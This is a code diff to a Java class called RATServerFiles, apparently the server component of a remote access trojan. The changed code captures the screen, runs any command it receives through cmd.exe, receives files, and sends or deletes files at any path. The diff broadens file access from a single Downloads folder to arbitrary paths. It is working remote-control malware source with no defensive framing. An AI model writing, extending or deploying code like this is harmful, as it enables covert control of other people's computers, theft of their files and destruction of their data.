@@ -68,7 +68,7 @@ public class RATServerFiles {
         Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
         BufferedImage screenFullImage = robot.createScreenCapture(screenRect);
         String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
-        File outputFile = new File("C:\\Users\\Victor\\Pictures\\screenshot_" + timestamp + ".jpg");
+        File outputFile = new File("C:\\Users\\Test\\Pictures\\screenshot_" + timestamp + ".jpg");
         ImageIO.write(screenFullImage, "jpg", outputFile);
         out.writeUTF("Screenshot taken and saved as " + outputFile.getName());
         out.writeUTF("END_OF_RESPONSE");
@@ -79,11 +79,7 @@ public class RATServerFiles {
         StringBuilder output = new StringBuilder();
         try {
             ProcessBuilder builder = new ProcessBuilder();
-            if (System.getProperty("os.name").toLowerCase().startsWith("windows")) {
-                builder.command("cmd.exe", "/c", command);
-            } else {
-                builder.command("sh", "-c", command);
-            }
+            builder.command("cmd.exe", "/c", command);
             builder.redirectErrorStream(true);
             Process process = builder.start();
 
@@ -105,7 +101,7 @@ public class RATServerFiles {
     private static void receiveFile(DataInputStream in) throws IOException {
         String fileName = in.readUTF();
         long fileSize = in.readLong();
-        try (FileOutputStream fos = new FileOutputStream("C:\\Users\\Victor\\Downloads\\" + fileName)) {
+        try (FileOutputStream fos = new FileOutputStream("C:\\Users\\Test\\Downloads\\" + fileName)) {
             byte[] buffer = new byte[4096];
             int read;
             long totalRead = 0;
@@ -117,8 +113,8 @@ public class RATServerFiles {
         System.out.println("[Server] File received: " + fileName);
     }
 
-    private static void sendFile(DataOutputStream out, String fileName) throws IOException {
-        File file = new File("C:\\Users\\Victor\\Downloads\\" + fileName);
+    private static void sendFile(DataOutputStream out, String filePath) throws IOException {
+        File file = new File(filePath);
         if (file.exists()) {
             out.writeLong(file.length());
             try (FileInputStream fis = new FileInputStream(file)) {
@@ -129,20 +125,22 @@ public class RATServerFiles {
                 }
             }
             out.flush();
-            System.out.println("[Server] File sent: " + fileName);
+            System.out.println("[Server] File sent: " + filePath);
         } else {
             out.writeLong(0); // Indicate file not found
-            System.out.println("[Server] File not found: " + fileName);
+            System.out.println("[Server] File not found: " + filePath);
         }
     }
+    
 
-    private static void deleteFile(String fileName) {
-        File file = new File("C:\\Users\\Victor\\Downloads\\" + fileName);
+    private static void deleteFile(String filePath) {
+        File file = new File(filePath);
         if (file.exists()) {
             file.delete();
-            System.out.println("[Server] File deleted: " + fileName);
+            System.out.println("[Server] File deleted: " + filePath);
         } else {
-            System.out.println("[Server] File not found: " + fileName);
+            System.out.println("[Server] File not found: " + filePath);
         }
     }
+    
 }
